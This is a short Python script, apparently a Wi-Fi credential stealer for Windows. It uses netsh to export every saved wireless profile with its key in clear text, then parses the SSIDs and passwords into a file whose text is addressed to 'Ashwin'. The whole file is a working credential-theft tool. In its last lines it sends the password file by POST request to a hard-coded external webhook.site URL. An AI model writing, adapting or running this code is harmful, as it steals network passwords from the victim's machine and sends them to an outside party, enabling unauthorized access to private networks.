import subprocess
import os
import sys
import requests

# WebHook URL
url = 'https://webhook.site/e9a1fdc7-48b6-4d14-b849-8947b8ba3caa'

# Create a file
password_file = open("password.txt","w")
password_file.write("Hi Ashwin! Here is your Pasword:\n\n")
password_file.close()

# List
wifi_files=[]
wifi_names=[]
wifi_pass=[]

# Here we are going to exceute windows command using python...!
command =  subprocess.run(["netsh","wlan","export","profile","key=clear"],capture_output = True).stdout.decode()

# Print working directory
path = os.getcwd()

# For loop 
for filname in os.listdir(path):
    if filname.startswith("Wi-Fi") and filname.endswith(".xml"):
        wifi_files.append(filname)
        for i in wifi_files:
            with open(i,'r') as f:
                for line in f.readlines():
                    if "name" in line:
                        stripped = line.strip()
                        start = stripped[6:]
                        end = start[:-7]
                        wifi_names.append(end)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        start = stripped[13:]
                        end = start[:-14]
                        wifi_pass.append(end)
                    for x , y in zip(wifi_names,wifi_pass):
                        sys.stdout = open("password.txt", "a")
                        print("SSID: "+x, "password: "+y, sep='\n')
                        sys.stdout.close()

                        

#sending credentials to webhook using post request
with open("password.txt",'rb') as f:
    r = requests.post(url,data=f)
